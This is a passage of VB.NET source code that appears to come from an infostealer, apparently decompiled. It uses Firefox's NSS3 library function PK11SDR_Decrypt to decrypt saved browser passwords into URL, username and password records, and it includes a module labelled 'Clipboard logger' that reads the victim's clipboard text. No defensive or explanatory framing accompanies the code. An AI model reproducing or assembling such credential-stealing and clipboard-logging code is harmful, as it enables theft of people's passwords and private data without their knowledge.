        Dim sb As New StringBuilder(cypherText)

        Try
            Dim ffData() As Byte = Convert.FromBase64String(cypherText)

            ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length)
            Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length)

            Dim tSecDec As New TSECItem()
            Dim item As New TSECItem()
            item.SECItemType = 0
            item.SECItemData = ffDataUnmanagedPointer
            item.SECItemLen = ffData.Length

            If PK11SDR_Decrypt(item, tSecDec, 0) = 0 Then
                If tSecDec.SECItemLen <> 0 Then
                    Dim bvRet(tSecDec.SECItemLen - 1) As Byte
                    Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen)
                    Return Encoding.ASCII.GetString(bvRet)
                End If
            End If
        Catch
            Return Nothing
        Finally
            If ffDataUnmanagedPointer <> IntPtr.Zero Then
                Marshal.FreeHGlobal(ffDataUnmanagedPointer)

            End If
        End Try

        Return Nothing
    End Function

    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
    Public Delegate Function DLLFunctionDelegate4(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
    Public Delegate Function DLLFunctionDelegate5(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
    Public Function PK11SDR_Decrypt(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11SDR_Decrypt")
        Dim dll As DLLFunctionDelegate5 = CType(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate5)), DLLFunctionDelegate5)
        Return dll(data, result, cx)
    End Function

    <StructLayout(LayoutKind.Sequential)>
    Public Structure TSECItem
        Public SECItemType As Integer
        Public SECItemData As IntPtr
        Public SECItemLen As Integer
    End Structure
End Module

#End Region

#Region "CredentialModel"
Public Class CredentialModel
    Public Property Url() As String
    Public Property Username() As String
    Public Property Password() As String
End Class
#End Region


#End Region



#Region "Clipboard logger"
Module NativeClipboard
    ' Token: 0x06000003 RID: 3
    <DllImport("user32.dll")> Private Function GetClipboardData(ByVal uFormat As UInteger) As IntPtr
    End Function
    <DllImport("user32.dll")> Private Function IsClipboardFormatAvailable(ByVal format As UInteger) As Boolean
    End Function
    <DllImport("user32.dll", SetLastError:=True)> Private Function OpenClipboard(ByVal hWndNewOwner As IntPtr) As Boolean
    End Function
    <DllImport("user32.dll", SetLastError:=True)> Private Function CloseClipboard() As Boolean
    End Function
    <DllImport("kernel32.dll")> Private Function GlobalLock(ByVal hMem As IntPtr) As IntPtr
    End Function
    <DllImport("kernel32.dll")> Private Function GlobalUnlock(ByVal hMem As IntPtr) As Boolean
    End Function
    Public Function GetClipboard() As String
        On Error Resume Next
        If Not IsClipboardFormatAvailable(13) Then Exit Function
        If Not OpenClipboard(IntPtr.Zero) Then Exit Function
        Dim data As String = Nothing
        Dim hGlobal = GetClipboardData(13)

        If hGlobal <> IntPtr.Zero Then
            Dim lpwcstr = GlobalLock(hGlobal)

            If lpwcstr <> IntPtr.Zero Then
                data = Marshal.PtrToStringUni(lpwcstr)
                GlobalUnlock(lpwcstr)
            End If
        End If

        CloseClipboard()

        Return data
    End Function
End Module
#End Region
